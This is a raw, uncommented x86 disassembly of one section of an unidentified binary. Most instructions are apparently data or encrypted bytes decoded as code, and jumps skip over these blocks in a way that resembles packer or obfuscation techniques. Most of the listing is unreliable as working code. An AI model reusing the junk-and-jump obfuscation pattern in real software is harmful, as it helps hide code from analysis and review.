  40f678:	ins    BYTE PTR es:[edi],dx
  40f679:	mov    cl,0x32
  40f67b:	iret   
  40f67c:	outs   dx,BYTE PTR ds:[esi]
  40f67d:	fmul   st(5),st
  40f67f:	inc    ebp
  40f680:	out    dx,al
  40f681:	push   edx
  40f682:	nop
  40f683:	loop   0x40f6b2
  40f685:	push   edi
  40f686:	inc    ebx
  40f687:	dec    ebp
  40f688:	mov    ebp,0x5829ab7f
  40f68d:	cmp    dl,BYTE PTR [ecx]
  40f68f:	xor    BYTE PTR [edx+0x21],dl
  40f692:	push   cs
  40f693:	ficom  WORD PTR [ecx]
  40f695:	push   es
  40f696:	out    0xde,eax
  40f698:	sub    eax,0xaa5f69b4
  40f69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f69e:	call   0xb13cb19c
  40f6a3:	loope  0x40f6e0
  40f6a5:	mov    ds:0x63d8509e,al
  40f6aa:	jle    0x40f6d4
  40f6ac:	jno    0x40f6cb
  40f6ae:	jle    0x40f65d
  40f6b0:	or     ebp,ebp
  40f6b2:	push   es
  40f6b3:	xor    al,0xb3
  40f6b5:	out    0xba,eax
  40f6b7:	and    ebx,DWORD PTR [ebp+0x66]
  40f6ba:	mov    esp,0x240c7c9e
  40f6bf:	aas    
  40f6c0:	inc    esp
  40f6c1:	and    eax,0xe2d86937
  40f6c6:	leave  
  40f6c7:	ds scas al,BYTE PTR es:[edi]
  40f6c9:	mov    cl,0x5a
  40f6cb:	sub    BYTE PTR [ecx],dh
  40f6cd:	sub    eax,0x6f4f31be
  40f6d2:	(bad)  
  40f6d3:	mov    eax,0x6b63f487
  40f6d8:	xor    bh,BYTE PTR [ebx+eiz*1-0x411f4ad]
  40f6df:	xor    al,0x34
  40f6e1:	push   ebp
  40f6e2:	inc    ebx
  40f6e3:	push   0xbbb32ebd
  40f6e8:	adc    al,0xe4
  40f6ea:	jns    0x40f692
  40f6ec:	mov    al,0xc3
  40f6ee:	jnp    0x40f676
  40f6f0:	ret    0xdce5
  40f6f3:	mov    ?,WORD PTR [ebp+0x40700b7b]
  40f6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6fa:	cmp    DWORD PTR [ecx],0x7a
  40f6fd:	mov    ecx,DWORD PTR [edi]
  40f6ff:	jmp    0x40f683
  40f701:	mov    ah,0xaa
  40f703:	(bad)  
  40f704:	fistp  WORD PTR [ebx]
  40f706:	jl     0x40f74e
  40f708:	mov    cl,0x87
  40f70a:	inc    esp
  40f70b:	cmp    BYTE PTR [eax],cl
  40f70d:	sub    BYTE PTR [eax+0xc],0x1d
  40f711:	xor    al,0xe0
  40f713:	jb     0x40f714
  40f715:	jg     0x40f6c1
  40f717:	or     al,0x56
  40f719:	jg     0x40f6e6
  40f71b:	adc    eax,edi
  40f71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71e:	fs std 
  40f720:	imul   edi,DWORD PTR [ecx-0x3d],0x624712bb
  40f727:	inc    edx
  40f728:	fcomp  DWORD PTR [esi+eax*8-0x26]
  40f72c:	leave  
  40f72d:	mov    eax,ds:0xdfc7794f
  40f732:	mov    ebp,0x8ba6a98d
  40f737:	popa   
  40f738:	or     edi,esp
  40f73a:	(bad)
  40f73e:	push   edi
  40f73f:	fmul   st(7),st
  40f741:	aad    0x86
  40f743:	aas    
  40f744:	lea    ebx,[esi-0x5c1a67e2]
  40f74a:	call   0x6c4e3510
  40f74f:	and    bl,BYTE PTR [edi-0x442bec06]
  40f755:	test   al,0x8f
  40f757:	rcl    al,1
  40f759:	aaa    
  40f75a:	mov    bl,0x6a
  40f75c:	into   
  40f75d:	push   edi
  40f75e:	je     0x40f74d
  40f760:	dec    ecx
  40f761:	dec    ebx
  40f762:	leave  
  40f763:	sub    dh,BYTE PTR [eax+eiz*2-0x18]
  40f767:	jne    0x40f75b
  40f769:	add    ch,cl
  40f76b:	retf   0xbbbf
  40f76e:	pop    ebx
  40f76f:	push   ds
  40f770:	arpl   WORD PTR [edi-0x4ebde9],dx
  40f776:	ret    0xd272
  40f779:	cmp    eax,0x6cf90b80
  40f77e:	mov    cl,0x65
  40f780:	out    0xcd,al
  40f782:	in     eax,0x7c
  40f784:	push   edi
  40f785:	fstp   DWORD PTR ds:0xba003c4f
  40f78b:	aas    
  40f78c:	pop    ecx
  40f78d:	jge    0x40f809
  40f78f:	add    bl,BYTE PTR [ecx-0x4c]
  40f792:	mov    esp,0x384e599c
  40f797:	icebp  
  40f798:	clc    
  40f799:	add    al,0x44
  40f79b:	jp     0x40f818
  40f79d:	shr    DWORD PTR [esi+0x1a],0x3a
  40f7a1:	push   esi
  40f7a2:	sub    ch,BYTE PTR [ebx-0x652dd028]
  40f7a8:	ins    BYTE PTR es:[edi],dx
  40f7a9:	mov    dl,0xed
  40f7ab:	jg     0x40f82b
  40f7ad:	fimul  WORD PTR [edi-0x2d]
  40f7b0:	push   es
  40f7b1:	mov    eax,ds:0x58e922da
  40f7b6:	xor    bh,BYTE PTR [eax]
  40f7b8:	daa    
  40f7b9:	pop    esp
  40f7ba:	mov    dl,0xa7
  40f7bc:	ds inc ebx
  40f7be:	data16 mov WORD PTR ds:0xcb153b11,fs
  40f7c5:	test   BYTE PTR [edx+0x20],0x22
  40f7c9:	pop    es
  40f7ca:	inc    esp
  40f7cb:	xchg   BYTE PTR [eax+0x25f5f5ef],ah
  40f7d1:	push   ecx
  40f7d2:	int3   
  40f7d3:	jge    0x40f7c2
  40f7d5:	or     al,0xbc
  40f7d7:	jle    0x40f7ff
  40f7d9:	mov    ds:0x2eaadd8c,eax
  40f7de:	rcl    BYTE PTR [ebx-0x2d],0x2c
  40f7e2:	adc    eax,0x59d460a7
  40f7e7:	lock add edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a9d9,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x69e2025f,ch
  40f80a:	fisub  WORD PTR [eax]
  40f80c:	inc    edi
  40f80d:	js     0x40f887
  40f80f:	in     eax,0x7e
  40f811:	js     0x40f88b
  40f813:	ins    BYTE PTR es:[edi],dx
  40f814:	loopne 0x40f84e
  40f816:	xor    al,0xd0
  40f818:	inc    ecx
  40f819:	sti    
  40f81a:	inc    eax
  40f81b:	imul   ebx,DWORD PTR [esi],0x95eca512
  40f821:	fnstcw WORD PTR [edx-0x2a]
  40f824:	add    ah,BYTE PTR ds:[ecx-0x4e16b414]
  40f82b:	es in  eax,dx
  40f82d:	stos   DWORD PTR es:[edi],eax
  40f82e:	inc    bl
  40f830:	fnstenv [eax-0x59]
  40f833:	es ss leave 
  40f836:	fnstsw WORD PTR ss:[esi-0x46]
  40f83a:	das    
  40f83b:	sub    eax,0xa01d830c
  40f840:	pop    es
  40f841:	in     eax,0xa6
  40f843:	ja     0x40f7cb
  40f845:	adc    DWORD PTR [edx+0x24a4566e],edx
  40f84b:	add    esi,DWORD PTR [edi-0x1223b1a2]
  40f851:	mov    edx,0x62c4c8a3
  40f856:	sbb    esp,DWORD PTR [ecx]
  40f858:	adc    eax,0x7dcc87e5
  40f85d:	inc    edx
  40f85e:	scas   al,BYTE PTR es:[di]
  40f860:	xchg   esp,eax
  40f861:	sbb    eax,0x70eb508d
  40f866:	pop    ds
  40f867:	jl     0x40f89a
  40f869:	outs   dx,DWORD PTR ds:[esi]
  40f86a:	pop    ss
  40f86b:	add    ebx,DWORD PTR [esi]
  40f86d:	pop    ebp
  40f86e:	popf   
  40f86f:	(bad)  
  40f870:	cmp    al,0x71
  40f872:	cli    
  40f873:	push   ecx
  40f874:	popa   
  40f875:	add    eax,0x25fd2d9a
  40f87a:	mov    bh,0x37
  40f87c:	xchg   DWORD PTR [ebp-0x5b66df27],esi
  40f882:	and    DWORD PTR [ebp-0x9],ebx
  40f885:	scas   eax,DWORD PTR es:[edi]
  40f886:	jns    0x40f83f
  40f888:	fistp  QWORD PTR [eax+0x1e]
  40f88b:	sub    BYTE PTR [ebp+0x4],cl
  40f88e:	fmulp  st(7),st
  40f890:	lea    edi,[ebp-0x226e1301]
  40f896:	xchg   ebp,eax
  40f897:	adc    al,0x1
  40f899:	mov    ebp,0x5d4a9cf
  40f89e:	pop    bp
  40f8a0:	fcmove st,st(5)
  40f8a2:	std    
  40f8a3:	xor    al,0x81
  40f8a5:	ret    
  40f8a6:	clc    
  40f8a7:	outs   dx,DWORD PTR ds:[esi]
  40f8a8:	mov    dh,0x86
  40f8aa:	imul   ecx,DWORD PTR [ebx+0x46d32ab3],0x23
  40f8b1:	and    ch,BYTE PTR [ebx+0x626cd63a]
  40f8b7:	out    0xde,eax
  40f8b9:	dec    al
  40f8bb:	xchg   esi,eax
  40f8bc:	enter  0x2148,0xe1
  40f8c0:	cmp    dl,BYTE PTR [ecx-0x5b]
  40f8c3:	pop    edx
  40f8c4:	fs mov esp,0x37f09aef
  40f8ca:	inc    ebx
  40f8cb:	mov    ecx,cs
  40f8cd:	pop    ds
  40f8ce:	inc    eax
  40f8cf:	(bad)  
  40f8d0:	leave  
  40f8d1:	push   esi
  40f8d2:	xlat   BYTE PTR ds:[ebx]
  40f8d3:	sub    DWORD PTR [edi+ebx*2-0x49],edi
  40f8d7:	addr16 pushf 
  40f8d9:	pusha  
  40f8da:	dec    eax
  40f8db:	xor    BYTE PTR [eax-0xe7d55be],0x28
  40f8e2:	push   es
  40f8e3:	sar    BYTE PTR [esi],0x3a
  40f8e6:	test   eax,0xc7c9ef9
  40f8eb:	mov    ds:0xf9019eb2,al
  40f8f0:	xlat   BYTE PTR ds:[ebx]
  40f8f1:	lods   eax,DWORD PTR ds:[esi]
  40f8f2:	sbb    ah,bl
  40f8f4:	push   ss
  40f8f5:	sub    al,0x6a
  40f8f7:	test   al,0x7a
  40f8f9:	push   ds
  40f8fa:	mov    ah,0xe5
  40f8fc:	push   edi
  40f8fd:	jnp    0x40f8bc
  40f8ff:	(bad)  
  40f900:	jp     0x40f8b9
  40f902:	inc    ebp
  40f903:	add    edi,DWORD PTR [ebx+ebp*2-0xf]
  40f907:	add    ebp,esp
  40f909:	cwde   
  40f90a:	retf   0x7839
  40f90d:	ins    DWORD PTR es:[edi],dx
  40f90e:	cdq    
  40f90f:	(bad)  
  40f910:	dec    ebp
  40f911:	add    BYTE PTR [edx-0x1b],0xc8
  40f915:	and    BYTE PTR [ebp-0x3d83166d],ah
  40f91b:	inc    esp
  40f91c:	mov    dl,0x20
  40f91e:	adc    ch,BYTE PTR [eax+0x6b6df85c]
  40f924:	adc    al,0xa3
  40f926:	push   cs
  40f927:	in     eax,dx
  40f928:	icebp  
  40f929:	aaa    
  40f92a:	rcl    BYTE PTR [esp+ebp*2-0x6b],1
  40f92e:	mov    edi,0xecec7f3a
  40f933:	in     al,dx
  40f934:	and    al,0xfb
  40f936:	xor    al,0x68
  40f938:	nop
  40f939:	and    al,0x91
  40f93b:	ins    BYTE PTR es:[edi],dx
  40f93c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f93d:	lock mov eax,0xafcf9aea
  40f943:	mov    cl,0x68
  40f945:	scas   al,BYTE PTR es:[edi]
  40f946:	fmul   QWORD PTR [esi]
  40f948:	jno    0x40f8d3
  40f94a:	jmp    0x388b:0x5902b6d8
  40f951:	test   ebx,eax
  40f953:	(bad)  
  40f955:	xor    esi,esp
  40f957:	push   cs
  40f958:	les    ebx,FWORD PTR [edx+0x6c152302]
  40f95e:	or     ecx,DWORD PTR [edi]
  40f960:	int    0xaf
  40f962:	(bad)  
  40f963:	jge    0x40f90d
  40f965:	push   edi
  40f966:	jnp    0x40f9c5
  40f968:	mov    cl,0xd2
  40f96a:	mov    dl,0x7e
  40f96c:	lods   eax,DWORD PTR ds:[esi]
  40f96d:	cmp    BYTE PTR [edi-0x4bffe7ee],ch
  40f973:	jbe    0x40f94a
  40f975:	and    ch,dl
  40f977:	ja     0x40f9a8
  40f979:	inc    edi
  40f97a:	and    ecx,esi
  40f97c:	xor    bl,BYTE PTR [edx-0x72cd4ee0]
  40f982:	fild   WORD PTR [esi]
  40f984:	jae    0x40f976
  40f986:	inc    ebx
  40f987:	inc    ebp
  40f988:	sbb    BYTE PTR [ebp-0x75],bl
  40f98b:	addr16 pop edx
  40f98d:	aam    0x37
  40f98f:	shl    cl,cl
  40f991:	mov    ebx,cs
  40f993:	add    eax,0xf01a904e
  40f998:	jo     0x40f9e4
  40f99a:	mov    eax,ds:0x807fac09
  40f99f:	fmul   DWORD PTR [ebx-0x42]
  40f9a2:	push   edi
  40f9a3:	adc    dl,ch
  40f9a5:	push   0x84765680
  40f9aa:	(bad)  
  40f9ab:	xchg   esi,eax
  40f9ac:	arpl   WORD PTR [edi],bx
  40f9ae:	mov    eax,ds:0x61efb9b1
  40f9b3:	adc    al,0x7a
  40f9b5:	shr    ah,1
  40f9b7:	mov    dh,bl
  40f9b9:	jo     0x40f99c
  40f9bb:	sbb    al,bh
  40f9bd:	arpl   WORD PTR [edx-0x10836338],si
  40f9c3:	stos   BYTE PTR es:[edi],al
  40f9c4:	stc    
  40f9c5:	push   ds
  40f9c6:	cmp    ebx,esi
  40f9c8:	arpl   si,di
  40f9ca:	dec    eax
  40f9cb:	imul   ecx,DWORD PTR [esi-0x45ed871e],0xcc3349fc
  40f9d5:	add    ebp,0x93879c2
  40f9db:	push   0xffffffb7
  40f9dd:	(bad)  
  40f9de:	jg     0x40fa08
  40f9e0:	sub    cl,BYTE PTR [ebx+0x2]
  40f9e3:	mov    esi,0xa92c2d6a
  40f9e8:	out    0x40,al
  40f9ea:	bound  edi,QWORD PTR [eax]
  40f9ec:	and    DWORD PTR [ecx],esp
  40f9ee:	fst    st(3)
  40f9f0:	lahf   
  40f9f1:	xchg   ebx,eax
  40f9f2:	mov    ecx,ecx
  40f9f4:	mov    edx,0x6862a26f
  40f9f9:	mov    eax,0x2da75a63
  40f9fe:	mov    eax,0x732aa518
  40fa03:	out    dx,al
  40fa04:	mov    ds:0xab742650,al
  40fa09:	cmp    BYTE PTR [esi],0xe6
  40fa0c:	and    eax,0x43e35213
  40fa11:	inc    edi
  40fa12:	or     eax,0xa70bb272
  40fa17:	ret    
  40fa18:	mov    al,ds:0xce96a00
  40fa1d:	xlat   BYTE PTR ds:[ebx]
  40fa1e:	lock fcomi st,st(0)
  40fa21:	mov    eax,ds:0x33092f08
  40fa26:	or     al,0x53
  40fa28:	lds    ebp,FWORD PTR [ebp+0x13]
  40fa2b:	sbb    al,cl
  40fa2d:	mov    bh,0x7f
  40fa2f:	jg     0x40fa46
  40fa31:	ins    BYTE PTR es:[edi],dx
  40fa32:	inc    edx
  40fa33:	call   0xa6f4:0x93e145a9
  40fa3a:	pop    edx
  40fa3b:	sbb    al,0x16
  40fa3d:	sahf   
  40fa3e:	leave  
  40fa3f:	lods   al,BYTE PTR ds:[esi]
  40fa40:	out    0x59,al
  40fa42:	pusha  
  40fa43:	cmp    al,0xee
  40fa45:	leave  
  40fa46:	mov    BYTE PTR [ebx],dh
  40fa48:	cld    
  40fa49:	mov    BYTE PTR [esi-0x37],0x13
  40fa4d:	iret   
  40fa4e:	(bad)  [esp+esi*2]
  40fa51:	jp     0x40fac6
  40fa53:	mov    dl,BYTE PTR cs:[esi+0x4b]
  40fa57:	retf   0xddad
  40fa5a:	mov    DWORD PTR [edx-0x3b],esp
  40fa5d:	pop    edi
  40fa5e:	fcomp  QWORD PTR [edi-0x46]
  40fa61:	sub    BYTE PTR [esi],cl
  40fa63:	mov    ch,0x5b
  40fa65:	xor    eax,0x94354c9d
  40fa6a:	mov    esi,0x3e8c4e7f
  40fa6f:	jle    0x40fab2
  40fa71:	mov    eax,0x585d415b
  40fa76:	dec    esp
  40fa77:	add    dl,BYTE PTR [eax+0x145754c4]
  40fa7d:	pushf  
  40fa7e:	je     0x414e2f
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42aa69,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42aa21,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42aa21,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42aa21,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42aa21,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42aa21
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42aa21,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42aa21
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42aa21,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fabc
  40fb0f:	cmp    BYTE PTR [ebp+ecx*1-0x73],bl
  40fb13:	inc    ebp
  40fb14:	js     0x40fb8e
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	and    al,0x10
  40fb1c:	add    al,0xdf
  40fb1e:	fnstsw WORD PTR [ecx+0x1f6cb187]
  40fb24:	lock leave 
  40fb26:	add    BYTE PTR [edx+eiz*2-0xe4f7e18],ch
  40fb2d:	jecxz  0x40fb98
  40fb2f:	jle    0x40fb28
  40fb31:	add    edx,ecx
  40fb33:	jns    0x40faf9
  40fb35:	xor    BYTE PTR [ebp-0x6a841513],bl
  40fb3b:	pop    ebx
  40fb3c:	xor    al,0x5a
  40fb3e:	daa    
  40fb3f:	in     eax,0x2
  40fb41:	jno    0x40fbc0
  40fb43:	pop    esp
  40fb44:	pusha  
  40fb45:	fdiv   DWORD PTR [edi-0x69]
  40fb48:	leave  
  40fb49:	sbb    al,BYTE PTR [di-0x7b]
  40fb4d:	pop    ecx
  40fb4e:	fdivr  st(4),st
  40fb50:	outs   dx,BYTE PTR ds:[esi]
  40fb51:	stos   BYTE PTR es:[edi],al
  40fb52:	in     al,0xf4
  40fb54:	out    dx,al
  40fb55:	shl    DWORD PTR [edi+0x1bcebbb5],1
  40fb5b:	and    DWORD PTR [edi+0x1ad8e218],esp
  40fb61:	sbb    ah,BYTE PTR [esi+0x2]
  40fb64:	hlt    
  40fb65:	cmp    DWORD PTR [eax-0x580550bc],edx
  40fb6b:	mov    al,ds:0x45a93357
  40fb70:	sbb    DWORD PTR [edx-0x53],0xb0e18d3c
  40fb77:	(bad)  
  40fb78:	int    0x94
  40fb7a:	jo     0x40fb36
  40fb7c:	sub    eax,0xdcacbbb1
  40fb81:	xor    DWORD PTR [eax+0x5d],0xff97cb84
  40fb88:	sub    ecx,esp
  40fb8a:	inc    edi
  40fb8b:	fsub   DWORD PTR [ebx]
  40fb8d:	and    eax,edx
  40fb8f:	push   ss
  40fb90:	jnp    0x40fb97
  40fb92:	push   eax
  40fb93:	jg     0x40fc04
  40fb95:	jno    0x40fb9f
  40fb97:	jno    0x40fb6c
  40fb99:	sti    
  40fb9a:	rol    BYTE PTR [edi-0x23],cl
  40fb9d:	leave  
  40fb9e:	inc    eax
  40fb9f:	aam    0x49
  40fba1:	loop   0x40fba0
  40fba3:	pop    ds
  40fba4:	mov    dl,0xb0
  40fba6:	out    dx,eax
  40fba7:	adc    bh,dh
  40fba9:	lahf   
  40fbaa:	loop   0x40fb36
  40fbac:	aam    0xaa
  40fbae:	call   0xb3a1:0xf1c460ed
  40fbb5:	jno    0x40fb84
  40fbb7:	arpl   WORD PTR [eax],si
  40fbb9:	cmc    
  40fbba:	or     DWORD PTR [edi+0x6322c6bf],ebx
  40fbc0:	dec    edx
  40fbc1:	mov    DWORD PTR [edi-0x640f0aac],esi
  40fbc7:	dec    esi
  40fbc8:	push   0x58027cc2
  40fbcd:	outs   dx,DWORD PTR ds:[esi]
  40fbce:	sar    BYTE PTR [eax],1
  40fbd0:	jbe    0x40fbae
  40fbd2:	out    0x62,eax
  40fbd4:	add    al,0xfe
  40fbd6:	sti    
  40fbd7:	outs   dx,BYTE PTR ds:[esi]
  40fbd8:	test   eax,0xdcb492cf
  40fbdd:	jbe    0x40fbbb
  40fbdf:	or     bh,cl
  40fbe1:	fmul   QWORD PTR [ebx+0x632ddbd2]
  40fbe7:	sbb    eax,0xd2b5d20
  40fbec:	add    bl,BYTE PTR [edx-0x43]
  40fbef:	retf   
  40fbf0:	pop    ecx
  40fbf1:	cld    
  40fbf2:	pop    esp
  40fbf3:	lods   al,BYTE PTR ds:[esi]
  40fbf4:	mov    bh,BYTE PTR [edx+0x60]
  40fbf7:	cmp    dl,dl
  40fbf9:	mov    ch,bh
  40fbfb:	loope  0x40fbbb
  40fbfd:	in     al,0x2e
  40fbff:	pusha  
  40fc00:	in     al,dx
  40fc01:	dec    edi
  40fc02:	fs jp  0x40fc19
  40fc05:	out    0x48,eax
  40fc07:	xchg   DWORD PTR [edx],ecx
  40fc09:	or     al,0x82
  40fc0b:	ss sbb al,0x8e
  40fc0e:	jle    0x40fbbd
  40fc10:	les    eax,FWORD PTR [ecx]
  40fc12:	jmp    DWORD PTR [edi]
  40fc14:	(bad)  
  40fc15:	cmc    
  40fc16:	sbb    esi,ebx
  40fc18:	fs pop ebp
  40fc1a:	loope  0x40fc4d
  40fc1c:	loopne 0x40fbb0
  40fc1e:	mov    ebp,0xd870c698
  40fc23:	inc    ebp
  40fc24:	fistp  DWORD PTR [ebx]
  40fc26:	sub    DWORD PTR [eax-0x266c1a99],ebx
  40fc2c:	(bad)  [edi]
  40fc2e:	push   0xc8a246d0
  40fc33:	cwde   
  40fc34:	out    0xa6,al
  40fc36:	scas   al,BYTE PTR es:[edi]
  40fc37:	inc    esp
  40fc38:	stos   DWORD PTR es:[edi],eax
  40fc39:	jecxz  0x40fc21
  40fc3b:	enter  0x4c1f,0x8b
  40fc3f:	cmp    al,0xb7
  40fc41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc42:	out    dx,al
  40fc43:	mov    ebp,es
  40fc45:	jno    0x40fc3c
  40fc47:	jge    0x40fca4
  40fc49:	outs   dx,BYTE PTR ds:[esi]
  40fc4a:	push   edx
  40fc4b:	cmp    DWORD PTR [ecx],esi
  40fc4d:	ds aaa 
  40fc4f:	shr    DWORD PTR [ecx],cl
  40fc51:	add    al,0x9b
  40fc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc54:	xor    BYTE PTR [esi+0x15],ah
  40fc57:	xchg   ebp,eax
  40fc58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc5a:	sub    BYTE PTR gs:[ebx+ebx*8-0x30040515],bh
  40fc62:	sub    ah,ch
  40fc64:	add    ebx,ecx
  40fc66:	xor    DWORD PTR [ebx+0x61],ebp
  40fc69:	aaa    
  40fc6a:	icebp  
  40fc6b:	stc    
  40fc6c:	or     al,0xd3
  40fc6e:	or     BYTE PTR [edx],0x56
  40fc71:	rol    BYTE PTR [ebx+0x32],0x2c
  40fc75:	sub    ebp,ecx
  40fc77:	mov    eax,0xe17a7ca3
  40fc7c:	push   ecx
  40fc7d:	std    
  40fc7e:	xchg   esi,eax
  40fc7f:	sub    eax,0x355b9fae
  40fc84:	sub    al,0x5e
  40fc86:	mov    eax,ds:0xaa782fde
  40fc8b:	pop    ebp
  40fc8c:	mov    bl,BYTE PTR [eax]
  40fc8e:	push   ebp
  40fc8f:	lock mov cs,esi
  40fc92:	out    dx,eax
  40fc93:	inc    ebx
  40fc94:	dec    eax
  40fc95:	jbe    0x40fcdf
  40fc97:	mov    dl,0x8d
  40fc99:	xor    BYTE PTR [edx-0x7e],ch
  40fc9c:	int3   
  40fc9d:	addr16 pop edi
  40fc9f:	mov    BYTE PTR [ebx],bl
  40fca1:	adc    DWORD PTR [esi+0x27],edi
  40fca4:	jns    0x40fc4e
  40fca6:	jg     0x40fcab
  40fca8:	inc    ebp
  40fca9:	gs sbb al,0xd
  40fcac:	in     eax,0xf2
  40fcae:	sbb    cl,BYTE PTR [edi+eiz*2]
  40fcb1:	and    eax,0xa72c7b1d
  40fcb7:	outs   dx,BYTE PTR ds:[esi]
  40fcb8:	inc    ecx
  40fcb9:	(bad)  
  40fcba:	jb     0x40fc64
  40fcbc:	std    
  40fcbd:	test   al,0x78
  40fcbf:	cmp    BYTE PTR [edx+0x33c7f2],ah
  40fcc5:	imul   eax,DWORD PTR [ebp+eax*4-0x2f3f3aeb],0x3c
  40fccd:	add    al,0x2
  40fccf:	jp     0x40fd24
  40fcd1:	fs popa 
  40fcd3:	stos   DWORD PTR es:[edi],eax
  40fcd4:	out    dx,eax
  40fcd5:	sub    ch,BYTE PTR [eax-0x3f29dcc4]
  40fcdb:	es mov ah,0x2
  40fcde:	inc    edx
  40fcdf:	jmp    0x40fd53
  40fce1:	bound  ecx,QWORD PTR [esi+edx*2+0x3a954d6]
  40fce8:	add    eax,0xd15e7f14
  40fced:	les    ecx,FWORD PTR [eax-0x593fd8bf]
  40fcf3:	outs   dx,BYTE PTR ds:[esi]
  40fcf4:	push   0xffffffcd
  40fcf6:	into   
  40fcf7:	shl    DWORD PTR [eax+edx*2],0xa4
  40fcfb:	push   edx
  40fcfc:	les    ebp,FWORD PTR [ebx]
  40fcfe:	ins    BYTE PTR es:[edi],dx
  40fcff:	(bad)  
  40fd00:	in     eax,0x6c
  40fd02:	add    ecx,DWORD PTR [eax]
  40fd04:	in     al,dx
  40fd05:	dec    ebx
  40fd06:	xchg   DWORD PTR [ebp+0x6b25432c],esp
  40fd0c:	inc    ebx
  40fd0d:	mov    dh,0x63
  40fd0f:	aad    0xef
  40fd11:	les    ebx,FWORD PTR ds:0x9019a51b
  40fd17:	sar    BYTE PTR [edi+ebx*8+0x7c684476],0x5d
  40fd1f:	or     BYTE PTR [eax],bh
  40fd21:	and    edx,esp
  40fd23:	sbb    esp,DWORD PTR [esi]
  40fd25:	dec    edi
  40fd26:	les    ebp,FWORD PTR [edx+eax*2+0x2]
  40fd2a:	jg     0x40fd14
  40fd2c:	add    eax,0x2e17a2ca
  40fd31:	sysexit 
  40fd33:	in     eax,0x11
  40fd35:	arpl   WORD PTR [ebp-0x63dcf681],cx
  40fd3b:	cwde   
  40fd3c:	addr16 loopne 0x40fd7b
  40fd3f:	(bad)  
  40fd40:	xlat   BYTE PTR ds:[ebx]
  40fd41:	jmp    0x40fd7e
  40fd43:	cmp    al,cl
  40fd45:	out    dx,eax
  40fd46:	fst    DWORD PTR [edx+0x16]
  40fd49:	jg     0x40fd49
  40fd4b:	lds    eax,FWORD PTR [ecx+0x5d]
  40fd4e:	inc    esp
  40fd4f:	(bad)  
  40fd50:	icebp  
  40fd51:	xor    ecx,DWORD PTR [ecx-0x16]
  40fd54:	mov    WORD PTR [edx+edi*1-0x6b],?
  40fd58:	lahf   
  40fd59:	adc    al,0xaf
  40fd5b:	bound  esi,QWORD PTR [edx+0x748bfdad]
  40fd61:	arpl   WORD PTR [ecx-0x5d],ax
  40fd64:	jb     0x40fdc7
  40fd66:	popf   
  40fd67:	push   edx
  40fd68:	inc    esp
  40fd69:	div    DWORD PTR [esi+edx*4+0x70]
  40fd6d:	mov    bh,0xfa
  40fd6f:	push   edx
  40fd70:	sbb    eax,ecx
  40fd72:	mov    ebx,0x6635f63c
  40fd77:	aaa    
  40fd78:	fdivp  st(2),st
  40fd7a:	sub    DWORD PTR [edi-0x67d77860],ebx
  40fd80:	cs push ds
  40fd82:	ds nop
  40fd84:	push   ds
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	iret   
  40fdbc:	shl    dl,0x7c
  40fdbf:	jp     0x40fe0c
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	popa   
  40fdc8:	cli    
  40fdc9:	cmp    esp,eax
  40fdcb:	cmp    DWORD PTR [edi-0x73],edi
  40fdce:	xchg   esi,eax
  40fdcf:	pop    esp
  40fdd0:	lods   eax,DWORD PTR ds:[esi]
  40fdd1:	xchg   ebp,eax
  40fdd2:	dec    BYTE PTR [ecx+0x3ee6455f]
  40fdd8:	into   
  40fdd9:	popa   
  40fdda:	pop    edi
  40fddb:	lahf   
  40fddc:	inc    ebp
  40fddd:	sbb    DWORD PTR [edx-0x3f4c30c0],esi
  40fde3:	pop    ss
  40fde4:	es jp  0x40fe16
  40fde7:	in     eax,0x50
  40fde9:	adc    al,0x97
  40fdeb:	add    BYTE PTR [edi-0x9],dl
  40fdee:	push   esi
  40fdef:	retf   0xf4a5
